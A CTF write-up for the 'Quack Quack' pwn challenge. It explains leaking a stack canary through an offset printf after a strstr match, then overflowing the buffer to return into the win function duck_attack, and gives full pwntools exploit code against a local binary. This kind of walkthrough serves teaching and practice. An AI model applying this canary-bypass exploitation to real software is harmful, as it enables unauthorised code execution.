---
title: "Quack Quack 🦆 - Stack Canary Exploit Writeup"
tags: [CTF, binary exploitation, stack canary, ret2win, pwn]
---

# Quack Quack 🦆

On the quest to reclaim the Dragon's Heart, the wicked Lord Malakar has cursed the villagers, turning them into ducks! Join Sir Alaric in finding a way to defeat them without causing harm.

**Quack Quack**, it's time to face the Duck!

## Inspection 🕵️

First we can check the protections enabled on the binary:

![image](https://github.com/user-attachments/assets/632ab392-d266-4b5b-8342-2e543a6702e0)

We can see that there is a canary. Then, in Ghidra:

![image](https://github.com/user-attachments/assets/ab52d254-fd1b-4f6b-8f73-2976fce00e0d)

We can see that in the first input, we must put "Quack Quack ", otherwise the binary displays "Where are your Quack Manners?!" and exit.

Three interesting lines here:
- `read(0,&local_88,0x66);`
- `pcVar1 = strstr((char *)&local_88,"Quack Quack ");` -> take the position of our "Quack Quack "
- `printf("Quack Quack %s, ready to fight the Duck?\n\n> ",pcVar1 + 0x20);` -> Display the stuff at this position +0x20. Interesting, we can leak something! 

This offset lets us leak data from the stack, starting 0x20 bytes after our "Quack Quack ", which helps us reach part of the canary.

Let's try to push a string with a specific length, and "Quack Quack " at the very end: 

- 0x66 => 102 in decimal
- "Quack Quack " => 12 characters

After some debugging with gdb, I saw that I needed exactly 89 + 12 characters to reach the canary:

```
from pwn import *

p = process("./vuln")

offset_to_canary = 89
payload = b"A" * offset_to_canary
payload += b"Quack Quack "

p.sendafter(b'> ', payload)

p.recvuntil(b'Quack Quack ')
leak = p.recvuntil(b', ready to fight the Duck?', drop=True)

canary_partial = leak[:7]

canary = b'\x00' + canary_partial
canary_val = u64(canary)

log.success(f"Canary leak : {hex(canary_val)}")
```



![image](https://github.com/user-attachments/assets/dcc251ad-8d84-4e01-8e58-7bc934893c4f)

Ok, now we leaked the canary, we're able to overwrite RIP and take control of the win function, "duck_attack": 

![image](https://github.com/user-attachments/assets/d49253e1-4c63-4377-8590-72eb7080e0fa)

Located at the address "0x0040137f" **(NO PIE)**

## Full exploit 🎯

```
from pwn import *

p = process("./vuln")

offset_to_canary = 89
payload = b"A" * offset_to_canary
payload += b"Quack Quack "

p.sendafter(b'> ', payload)

p.recvuntil(b'Quack Quack ')
leak = p.recvuntil(b', ready to fight the Duck?', drop=True)

canary_partial = leak[:7]

canary = b'\x00' + canary_partial
canary_val = u64(canary)

log.success(f"Canary leak : {hex(canary_val)}")

payload2  = b"A" * 88
payload2 += p64(canary_val)
payload2 += p64(0)
payload2 += p64(0x0040137f) # address of duck_attack()

p.sendafter(b'> ', payload2)

p.interactive()
```

![image](https://github.com/user-attachments/assets/76a2911b-254b-4b15-8c70-a74796145322)

Pwned! 🦆🔥

## Conclusion 🧠

By abusing a format-based leak and a stack canary bypass, we successfully redirected execution to the `duck_attack` function and defeated the cursed villagers. 
 
Sir Alaric wins again — without harming a single duck. 🦆✨

